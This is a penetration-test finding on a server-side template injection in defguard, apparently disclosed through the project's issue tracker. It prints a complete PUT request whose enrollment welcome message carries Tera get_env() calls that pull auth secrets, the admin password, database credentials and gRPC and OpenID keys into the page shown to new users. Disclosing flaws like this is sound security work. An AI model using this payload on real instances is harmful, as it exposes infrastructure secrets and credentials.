---
title: "DG25-8: Server-Side Template Injection (SSTI)"
severity: Medium
cvss_score: 6.9
status: Completed
cvss_string: "CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:L/A:N"
issue_link: https://github.com/DefGuard/defguard/issues/1512
---

### Technical details

The vulnerability occurs due to improper validation of user-provided
Tera templates before rendering them. An attacker with administrative
access can craft a specially designed Tera template (enrollment
welcome-message) that, when processed by the server, extracts and
displays environment variables that contain sensitive information.

The exact mechanism involves the use of template syntax to access
environment variables, which are then rendered as part of the output.

Enrollment welcome-message with embedded Tera template get_env()
functions can be created either in the web application\'s UI:

![](/images/pentest/DG25/img1.png)

or directly by sending PUT request to the server:

**Request:**\
\
**PUT** /api/v1/settings **HTTP**/2\
**Host:** defguard.dvpnsec.net\
**Cookie:** defguard_session=zKvOID25Ytom8nansXbqP9W5\
**Content**-**Length:** 4410\
**Content**-**Type:** application/json\
**User**-**Agent:** **Mozilla**/5.0 (**Windows** **NT** 10.0; **Win64**;
x64) **AppleWebKit**/537.36 (**KHTML**, like **Gecko**)
**Chrome**/138.0.0.0 **Safari**/537.36\
**Origin:** https**://**defguard.dvpnsec.net\
**Referer:** https**://**defguard.dvpnsec.net/admin/enrollment\

```json
{
  "challenge_template": "Please read this carefully:\n\nClick to sign to prove you are in possesion of your private key to the account.\nThis request will not trigger a blockchain transaction or cost any gas fees.",
  "enrollment_use_welcome_message_as_email": true,
  "enrollment_vpn_step_optional": true,
  "enrollment_welcome_email": "Dear {{ first_name }} {{ last_name }},\n\nBy completing the enrollment process, you now have access to all company systems.\n\nYour login to all systems is: {{ username }}\n\n## Company systems\n\nHere are the most important company systems:\n\n- defguard: {{ defguard_url }} - where you can change your password and manage your VPN devices\n- our chat system: https://chat.example.com - join our default room #TownHall\n- knowledge base: https://example.com ...\n- our JIRA: https://example.atlassian.net...\n\n## Governance\n\nTo kickoff your onboarding, please get familiar with:\n\n- our employee handbook: https://knowledgebase.example.com/Welcome\n- security policy: https://knowledgebase.example.com/security\n\nIf you have any questions contact our HR:\nJohn Hary - mobile +48 123 123 123\n\nThe person that enrolled you is:\n{{ admin_first_name }} {{ admin_last_name }},\nemail: {{ admin_email }}\nmobile: {{ admin_phone }}\n\n--\nSent by defguard {{ defguard_version }}\nStar us on GitHub! https://github.com/defguard/defguard",
  "enrollment_welcome_email_subject": "[defguard] Welcome message after enrollment",
  "enrollment_welcome_message": "==== ENV: General ====\n\nPATH = {{ get_env(name=\"PATH\") }}\n\nHOSTNAME = {{ get_env(name=\"HOSTNAME\") }}\n\nHOME = {{ get_env(name=\"HOME\") }}\n\n\n\n==== ENV: Core Secrets ====\n\nDEFGUARD_AUTH_SECRET = {{ get_env(name=\"DEFGUARD_AUTH_SECRET\") }}\n\nDEFGUARD_GATEWAY_SECRET = {{ get_env(name=\"DEFGUARD_GATEWAY_SECRET\") }}\n\nDEFGUARD_YUBIBRIDGE_SECRET = {{ get_env(name=\"DEFGUARD_YUBIBRIDGE_SECRET\") }}\n\nDEFGUARD_SECRET_KEY = {{ get_env(name=\"DEFGUARD_SECRET_KEY\") }}\n\nDEFGUARD_DEFAULT_ADMIN_PASSWORD = {{ get_env(name=\"DEFGUARD_DEFAULT_ADMIN_PASSWORD\") }}\n\n\n\n==== ENV: Database Credentials ====\n\nDEFGUARD_DB_HOST = {{ get_env(name=\"DEFGUARD_DB_HOST\") }}\n\nDEFGUARD_DB_PORT = {{ get_env(name=\"DEFGUARD_DB_PORT\") }}\n\nDEFGUARD_DB_USER = {{ get_env(name=\"DEFGUARD_DB_USER\") }}\n\nDEFGUARD_DB_PASSWORD = {{ get_env(name=\"DEFGUARD_DB_PASSWORD\") }}\n\nDEFGUARD_DB_NAME = {{ get_env(name=\"DEFGUARD_DB_NAME\") }}\n\n\n\n==== ENV: URLs and Web Configuration ====\n\nDEFGUARD_URL = {{ get_env(name=\"DEFGUARD_URL\") }}\n\nDEFGUARD_ENROLLMENT_URL = {{ get_env(name=\"DEFGUARD_ENROLLMENT_URL\") }}\n\nDEFGUARD_PROXY_URL = {{ get_env(name=\"DEFGUARD_PROXY_URL\") }}\n\nDEFGUARD_WEBAUTHN_RP_ID = {{ get_env(name=\"DEFGUARD_WEBAUTHN_RP_ID\") }}\n\nDEFGUARD_COOKIE_INSECURE = {{ get_env(name=\"DEFGUARD_COOKIE_INSECURE\") }}\n\nDEFGUARD_LOG_LEVEL = {{ get_env(name=\"DEFGUARD_LOG_LEVEL\") }}\n\n\n\n==== ENV: GRPC Certificates and Keys ====\n\nDEFGUARD_GRPC_CERT = {{ get_env(name=\"DEFGUARD_GRPC_CERT\") }}\n\nDEFGUARD_GRPC_KEY = {{ get_env(name=\"DEFGUARD_GRPC_KEY\") }}\n\nDEFGUARD_PROXY_GRPC_CA = {{ get_env(name=\"DEFGUARD_PROXY_GRPC_CA\") }}\n\n\n\n==== ENV: OpenID Key ====\n\nDEFGUARD_OPENID_KEY = {{ get_env(name=\"DEFGUARD_OPENID_KEY\") }}\n",
  "gateway_disconnect_notifications_enabled": false,
  "gateway_disconnect_notifications_inactivity_threshold": 5,
  "gateway_disconnect_notifications_reconnect_notification_enabled": false,
  "instance_name": "Defguard",
  "ldap_bind_username": "cn=admin,dc=example,dc=org",
  "ldap_enabled": false,
  "ldap_group_member_attr": "uniqueMember",
  "ldap_group_obj_class": "groupOfUniqueNames",
  "ldap_group_search_base": "ou=groups,dc=example,dc=org",
  "ldap_groupname_attr": "cn",
  "ldap_is_authoritative": false,
  "ldap_member_attr": "memberOf",
  "ldap_sync_enabled": false,
  "ldap_sync_groups": [],
  "ldap_sync_interval": 300,
  "ldap_sync_status": "OutOfSync",
  "ldap_tls_verify_cert": true,
  "ldap_use_starttls": false,
  "ldap_user_auxiliary_obj_classes": [
    "simpleSecurityObject",
    "sambaSamAccount"
  ],
  "ldap_user_obj_class": "inetOrgPerson",
  "ldap_user_search_base": "ou=users,dc=example,dc=org",
  "ldap_username_attr": "cn",
  "ldap_uses_ad": false,
  "main_logo_url": "/svg/logo-defguard-white.svg",
  "nav_logo_url": "/svg/defguard-nav-logo.svg",
  "openid_create_account": true,
  "openid_enabled": true,
  "openid_username_handling": "RemoveForbidden",
  "smtp_encryption": "StartTls",
  "webhooks_enabled": true,
  "wireguard_enabled": true,
  "worker_enabled": true
}
```
\
\
**Response:**\
\
**HTTP**/2 200 **OK**\
**Alt**-**Svc:** h3=*\":443\"*; ma=2592000\
**Content**-**Type:** application/json\
**Date:** **Tue**, 05 **Aug** 2025 09**:**36**:**51 **GMT**\
**Server:** **Caddy**\
**X**-**Defguard**-**Version:** 1.5.0-a29ac10\
**Content**-**Length:** 4\
\
null

Once new user is created and his enrollment process finishes - he is
presented with leaked underlying infrastructure secrets (such as
database credentials or main admin password):

![](/images/pentest/DG25/img2.png)